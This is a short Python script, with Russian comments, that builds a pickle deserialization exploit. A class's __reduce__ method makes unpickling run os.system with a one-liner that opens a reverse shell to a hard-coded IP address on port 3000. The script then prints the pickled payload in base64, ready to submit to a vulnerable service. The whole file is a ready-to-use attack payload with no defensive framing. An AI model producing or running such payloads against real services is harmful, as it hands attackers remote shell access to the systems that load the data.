import pickle
import base64
import os


class ReverseShell(object):
    def __reduce__(self):
        # Эта команда откроет обратное подключение на твой IP
        return (
            os.system,
            (
                """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("188.233.235.25",3000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' """,
            ),
        )


# Сериализуем payload
payload = pickle.dumps(ReverseShell())
payload_b64 = base64.b64encode(payload)

print(payload_b64.decode())
